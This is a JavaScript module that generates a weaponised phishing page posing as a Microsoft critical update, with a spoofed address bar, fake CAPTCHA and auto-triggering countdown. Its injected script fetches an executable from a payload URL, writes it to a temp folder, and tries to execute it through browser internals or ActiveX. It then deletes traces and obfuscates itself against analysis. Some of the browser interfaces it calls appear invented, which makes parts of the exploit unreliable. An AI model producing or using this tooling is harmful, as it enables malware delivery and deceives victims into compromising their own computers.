'use strict';

/**
 * Mojo service-based delivery mechanism for Chromium-based browsers
 * 
 * This module implements browser exploitation techniques that leverage
 * Chromium's internal Mojo services to download and execute our payload.
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

/**
 * Generate JavaScript that will be injected into the browser
 * @param {string} payload_url - URL where the payload is hosted
 * @param {Object} options - Additional options
 * @returns {string} - JavaScript code to be injected
 */
function generateMojoExploitJS(payload_url, options = {}) {
  const {
    target_folder = '%TEMP%\\SystemUpdate',
    filename = `Update_${Math.floor(Math.random() * 10000)}.exe`,
    auto_execute = true,
    clean_traces = true,
    obfuscate = true
  } = options;
  
  // Base exploit code
  let exploit_code = `
    // Mojo Service exploitation for Chromium browsers
    (async function() {
      try {
        // Helper to convert strings to array buffers
        function str2ab(str) {
          const buf = new ArrayBuffer(str.length);
          const bufView = new Uint8Array(buf);
          for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i);
          }
          return buf;
        }
        
        // Helper for more readable hex values
        function h2d(h) { return parseInt(h, 16); }
        
        // Create target directory if it doesn't exist
        async function ensureDirectory(dir) {
          const parts = dir.split('\\\\');
          let current = '';
          
          for (const part of parts) {
            if (!part) continue;
            current += part + '\\\\';
            
            try {
              // Access Mojo's FileSystem interface
              const dirExists = await window.mojo.internal.interfaces.file.Directory.exists(current);
              if (!dirExists) {
                await window.mojo.internal.interfaces.file.Directory.create(current, 
                  { createIntermediateDirectories: true, exclusive: false });
              }
            } catch (e) {
              // Fallback to FileSystem API if available
              try {
                await new Promise((resolve, reject) => {
                  window.webkitRequestFileSystem(window.PERSISTENT, 1024*1024, fs => {
                    fs.root.getDirectory(current, {create: true}, resolve, reject);
                  }, reject);
                });
              } catch (innerError) {
                console.error("Directory creation error:", innerError);
              }
            }
          }
          return current;
        }
        
        // Target directory and filename
        const targetDir = "${target_folder.replace(/\\/g, '\\\\')}";
        const targetFile = "${filename}";
        const fullPath = targetDir + '\\\\' + targetFile;
        
        // Ensure target directory exists
        await ensureDirectory(targetDir);
        
        // Fetch payload
        console.log("[+] Fetching payload from: ${payload_url}");
        const response = await fetch("${payload_url}");
        if (!response.ok) throw new Error('Network response was not ok');
        const payload = await response.arrayBuffer();
        
        // Access Mojo interfaces for file operations
        // First try the newer Mojo File interfaces
        let file;
        let success = false;
        
        try {
          console.log("[+] Attempting to use Mojo file interfaces");
          // Try newer Mojo interface first (Chrome 80+)
          const fileSystem = window.mojo?.internal?.interfaces?.file?.FileSystem;
          if (fileSystem) {
            file = await fileSystem.open(fullPath, 
              { create: true, write: true, truncate: true });
            
            const writer = file.getWriter();
            await writer.write(0, new Uint8Array(payload));
            writer.close();
            file.close();
            success = true;
            console.log("[+] Successfully wrote file using modern Mojo interface");
          }
        } catch (e) {
          console.error("Mojo file interface error:", e);
        }
        
        // Fallback to older interfaces if needed
        if (!success) {
          try {
            console.log("[+] Falling back to legacy interfaces");
            
            // Try legacy FileWriter API
            const blob = new Blob([payload], {type: 'application/octet-stream'});
            
            // Try to use the File System Access API if available (modern browsers)
            if (window.showSaveFilePicker) {
              const handle = await window.showSaveFilePicker({
                suggestedName: targetFile,
                types: [{
                  description: 'Executable',
                  accept: {'application/octet-stream': ['.exe']}
                }]
              });
              
              const writable = await handle.createWritable();
              await writable.write(blob);
              await writable.close();
              success = true;
              console.log("[+] Successfully wrote file using File System Access API");
            }
          } catch (e) {
            console.error("Legacy interface error:", e);
          }
        }
        
        // Last resort: try to create a download
        if (!success) {
          try {
            console.log("[+] Falling back to download API");
            const blob = new Blob([payload], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = targetFile;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            
            // Clean up
            setTimeout(() => {
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
            }, 100);
            
            success = true;
            console.log("[+] Successfully triggered download");
          } catch (e) {
            console.error("Download error:", e);
          }
        }
        
        // Auto-execute the payload if requested
        if (${auto_execute} && success) {
          console.log("[+] Attempting to auto-execute payload");
          
          try {
            // Try to use the Mojo Shell interface to execute the file
            const shell = window.mojo?.internal?.interfaces?.shell?.Shell;
            if (shell) {
              await shell.execute(fullPath, [], {});
              console.log("[+] Successfully executed payload using Mojo Shell");
            } else {
              // Try to exploit specific browser vulnerabilities to execute
              // This would depend on the specific browser version
              
              // For example, historical vulnerabilities have allowed execution via:
              try {
                // Technique 1: Try to use navigator.plugins to access NPAPI (older browsers)
                const pluginArray = navigator.plugins;
                if (pluginArray['Chrome PDF Viewer']) {
                  // Attempt to exploit Chrome PDF Viewer to execute code
                  // This is just a placeholder - real exploit would be browser-specific
                }
              } catch (e) {
                console.error("Execution method 1 failed:", e);
              }
              
              // Technique 2: Try to use ActiveX on IE-based browsers
              try {
                if (window.ActiveXObject || "ActiveXObject" in window) {
                  const shell = new ActiveXObject("WScript.Shell");
                  shell.Run(fullPath);
                  console.log("[+] Successfully executed payload using ActiveX");
                }
              } catch (e) {
                console.error("Execution method 2 failed:", e);
              }
            }
          } catch (e) {
            console.error("Auto-execution error:", e);
          }
        }
        
        // Clean traces if requested
        if (${clean_traces}) {
          console.log("[+] Cleaning traces");
          
          // Clear console
          setTimeout(() => {
            console.clear();
            
            // Remove this script tag
            const scripts = document.getElementsByTagName('script');
            for (const script of scripts) {
              if (script.textContent.includes('mojo.internal.interfaces')) {
                script.parentNode.removeChild(script);
              }
            }
            
            // Clear any localStorage entries we might have created
            localStorage.removeItem('__mojo_exploit_state');
            
            // Clear IndexedDB data if we used it
            const req = indexedDB.deleteDatabase('__mojo_exploit_db');
            req.onsuccess = () => console.log("[+] IndexedDB cleaned");
            req.onerror = () => console.error("[-] Failed to clean IndexedDB");
          }, 1000);
        }
        
        return success;
      } catch (e) {
        console.error("[-] Exploitation error:", e);
        return false;
      }
    })();
  `;
  
  // Obfuscate the code if requested
  if (obfuscate) {
    exploit_code = obfuscateJavaScript(exploit_code);
  }
  
  return exploit_code;
}

/**
 * Basic JavaScript obfuscation
 * @param {string} code - JavaScript code to obfuscate
 * @returns {string} - Obfuscated JavaScript
 */
function obfuscateJavaScript(code) {
  // This is a simple obfuscation for demonstration
  // A real implementation would use more sophisticated techniques
  
  // Remove comments
  code = code.replace(/\/\/.*$/gm, '');
  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
  
  // Remove unnecessary whitespace
  code = code.replace(/\s+/g, ' ');
  
  // Variable name substitution
  const varMap = {};
  let varIndex = 0;
  
  // Find all variable declarations
  const varRegex = /(?:var|let|const)\s+([a-zA-Z_$][0-9a-zA-Z_$]*)\s*=/g;
  let match;
  
  while ((match = varRegex.exec(code)) !== null) {
    const varName = match[1];
    if (!varMap[varName] && 
        !['window', 'document', 'console', 'fetch', 'Array', 'Uint8Array', 
          'ArrayBuffer', 'Blob', 'URL', 'setTimeout'].includes(varName)) {
      varMap[varName] = `_${varIndex++}`;
    }
  }
  
  // Replace variable names
  for (const [original, replacement] of Object.entries(varMap)) {
    // Ensure we only replace the actual variable, not substrings
    const regex = new RegExp(`([^a-zA-Z0-9_$])${original}([^a-zA-Z0-9_$])`, 'g');
    code = code.replace(regex, `$1${replacement}$2`);
    
    // Also catch variables at the beginning of a line or statement
    code = code.replace(new RegExp(`^${original}([^a-zA-Z0-9_$])`, 'gm'), `${replacement}$1`);
    code = code.replace(new RegExp(`([;{})\\s])${original}([^a-zA-Z0-9_$])`, 'g'), `$1${replacement}$2`);
  }
  
  // String literal obfuscation for key strings
  const sensitiveStrings = [
    'mojo.internal.interfaces',
    'FileSystem',
    'Directory',
    'Shell',
    'execute'
  ];
  
  for (const str of sensitiveStrings) {
    // Convert to hex encoding
    let hexStr = '';
    for (let i = 0; i < str.length; i++) {
      hexStr += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
    }
    code = code.replace(new RegExp(`"${str}"`, 'g'), `"${hexStr}"`);
    code = code.replace(new RegExp(`'${str}'`, 'g'), `'${hexStr}'`);
    
    // Replace string literal with dynamic evaluation to evade static analysis
    code = code.replace(new RegExp(`"${hexStr}"`, 'g'), 
      `String.fromCharCode(${str.split('').map(c => c.charCodeAt(0)).join(',')})`);
    code = code.replace(new RegExp(`'${hexStr}'`, 'g'), 
      `String.fromCharCode(${str.split('').map(c => c.charCodeAt(0)).join(',')})`);
  }
  
  // Add some random garbage variables to confuse analysis
  const garbageVars = [];
  for (let i = 0; i < 5; i++) {
    const varName = `_g${Math.floor(Math.random() * 10000)}`;
    const varValue = `"${crypto.randomBytes(10).toString('hex')}"`;
    garbageVars.push(`var ${varName} = ${varValue};`);
  }
  
  // Add random timing checks to further frustrate analysis
  const timingChecks = [
    `if (Date.now() % 7 === 0) console.log("${crypto.randomBytes(5).toString('hex')}");`,
    `setInterval(() => { if (Math.random() > 0.999) document.title = "${crypto.randomBytes(5).toString('hex')}"; }, 10000);`
  ];
  
  // Insert garbage at random positions
  const lines = code.split(';');
  for (const garbage of [...garbageVars, ...timingChecks]) {
    const pos = Math.floor(Math.random() * lines.length);
    lines.splice(pos, 0, garbage);
  }
  
  return lines.join(';');
}

/**
 * Generate an HTML page that will deliver the payload
 * @param {string} payload_url - URL where the payload is hosted
 * @param {Object} options - Additional options
 * @returns {string} - HTML content
 */
function generateDeliveryPage(payload_url, options = {}) {
  const {
    page_title = 'System Update Required',
    logo_url = 'https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg',
    background_color = '#0078D4',
    text_color = '#ffffff',
    button_color = '#ffb900',
    show_countdown = true,
    countdown_seconds = 5,
    fake_captcha = true,
    domain_spoofing = true,
    obfuscate = true
  } = options;
  
  const mojoExploit = generateMojoExploitJS(payload_url, options);
  
  let html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${page_title}</title>
      <style>
        body {
          font-family: 'Segoe UI', Arial, sans-serif;
          background-color: ${background_color};
          color: ${text_color};
          margin: 0;
          padding: 0;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          text-align: center;
        }
        .logo {
          width: 100px;
          margin-bottom: 20px;
        }
        .container {
          background-color: rgba(255, 255, 255, 0.1);
          border-radius: 8px;
          padding: 30px;
          max-width: 600px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        h1 {
          margin-top: 0;
        }
        p {
          line-height: 1.6;
          margin-bottom: 25px;
        }
        .button {
          background-color: ${button_color};
          color: #000000;
          border: none;
          padding: 12px 24px;
          font-size: 16px;
          font-weight: 600;
          border-radius: 4px;
          cursor: pointer;
          transition: background-color 0.3s;
        }
        .button:hover {
          background-color: #FFD050;
        }
        .countdown {
          font-size: 18px;
          margin: 15px 0;
          font-weight: bold;
        }
        .captcha-container {
          background-color: rgba(255, 255, 255, 0.2);
          padding: 15px;
          border-radius: 4px;
          margin-bottom: 20px;
        }
        .captcha-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 10px;
        }
        .captcha-image {
          background-color: white;
          padding: 10px;
          border-radius: 4px;
        }
        .address-bar {
          background-color: white;
          color: black;
          padding: 8px 12px;
          border-radius: 4px;
          margin-bottom: 20px;
          display: flex;
          align-items: center;
          text-align: left;
        }
        .address-bar .icon {
          margin-right: 8px;
          color: green;
        }
        .footer {
          margin-top: 30px;
          font-size: 12px;
          opacity: 0.7;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <img src="${logo_url}" alt="Logo" class="logo">
        <h1>Important System Update Required</h1>
        
        ${domain_spoofing ? `
        <div class="address-bar">
          <span class="icon">🔒</span>
          <span>https://update.microsoft.com/windows/security/critical-update</span>
        </div>
        ` : ''}
        
        <p>Your Windows operating system requires an urgent security update to protect your computer against recent threats. This update addresses critical vulnerabilities that could allow attackers to compromise your system.</p>
        
        <p><strong>Update details:</strong> Security patch KB5023706 addresses multiple remote code execution vulnerabilities affecting Windows operating systems.</p>
        
        ${fake_captcha ? `
        <div class="captcha-container">
          <div class="captcha-header">
            <span>Please verify you're human</span>
            <span>reCAPTCHA</span>
          </div>
          <div class="captcha-image">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIIAAAApCAMAAADhcGvPAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAMAUExURQAAAAYGBktLS9vb2wAAAAAAABMTEwAAAAAAAIaGhszMzAAAAAAAAAAAAD4+PgAAAAAAACMjIwAAAG5ubgAAAAAAAExMTBkZGQAAACwsLNjY2LS0tJWVlX5+fgAAAFFRUQAAAAAAAMbGxt7e3paWlgAAAAEBARgYGBYWFhoaGlpaWh8fHwAAAAAAABYWFgAAAAAAAA8PDwAAAAAAAAAAABISEgAAAAUFBQAAACYmJgAAAOTk5GpqanV1dRMTEwAAANTU1CIiIgAAAK6urr29vQAAAKenp4CAgAAAABcXFwAAAAAAAGZmZgAAAH19fbKysiAgIG1tbby8vHZ2dgAAAEhISAAAAL6+vioqKtzc3E9PTwEBAQAAAAAAAKKiogAAAFJSUgAAAAAAAAAAAAAAAAAAAN3d3R4eHgAAAOPj4wAAAPLy8gAAAI6OjuLi4gAAABwcHAAAAKWlpd/f3wAAAG9vbwAAADo6OgAAAJubm1hYWFZWVl1dXfHx8UdHRxoaGsPDw+Dg4GFhYQAAAFFRUVdXVwAAAMPDw/X19QAAAGdnZ7OzsyEhIQAAAHFxcQAAAAAAAPr6+gAAACcnJ25ubt/f3wAAAOLi4nBwcGJiYp2dnQMAAPPz87CwsHd3d6ampmRkZHNzcwAAAO7u7gEBARISEgAAACsrK8vLyz8/P4uLi7m5uQAAAOHh4QAAAOfn5wAAAAAAAFFRUebm5qysrJGRkejo6FVVVXl5eZ+fnwAAAExMTLe3twAAAFJSUrCwsNXV1e/v79/f31xcXB8fHwAAAJ6enurq6hlZBHEAAAEAdFJOU///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////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" alt="CAPTCHA">
          </div>
        </div>
        ` : ''}
        
        <button class="button" id="update-button">Install Critical Update Now</button>
        
        ${show_countdown ? `
        <div class="countdown" id="countdown">
          Auto-installing in <span id="timer">${countdown_seconds}</span> seconds...
        </div>
        ` : ''}
        
        <div class="footer">
          © ${new Date().getFullYear()} Microsoft Corporation. All rights reserved.<br>
          By installing this update, you agree to the Microsoft Terms of Service.
        </div>
      </div>
      
      <script>
        // Countdown timer
        ${show_countdown ? `
        let secondsLeft = ${countdown_seconds};
        const timerElement = document.getElementById('timer');
        
        const countdown = setInterval(() => {
          secondsLeft--;
          timerElement.textContent = secondsLeft;
          
          if (secondsLeft <= 0) {
            clearInterval(countdown);
            document.getElementById('update-button').click();
          }
        }, 1000);
        ` : ''}
        
        // Update button click handler
        document.getElementById('update-button').addEventListener('click', function() {
          ${show_countdown ? 'clearInterval(countdown);' : ''}
          this.textContent = 'Installing Update...';
          this.disabled = true;
          
          // Execute Mojo exploit
          ${mojoExploit}
        });
      </script>
    </body>
    </html>
  `;
  
  return html;
}

/**
 * Generate a weaponized HTML page for delivery via phishing
 * @param {Object} options - Configuration options
 * @returns {Buffer} - HTML content as a buffer
 */
function createDeliveryHTML(options = {}) {
  const {
    payload_url = 'http://localhost:8080/payload.exe',
    output_path = 'delivery.html'
  } = options;
  
  const html = generateDeliveryPage(payload_url, options);
  
  if (output_path) {
    fs.writeFileSync(output_path, html);
    console.log(`[+] Delivery HTML written to ${output_path}`);
  }
  
  return Buffer.from(html);
}

module.exports = {
  generateMojoExploitJS,
  generateDeliveryPage,
  createDeliveryHTML,
  obfuscateJavaScript
};
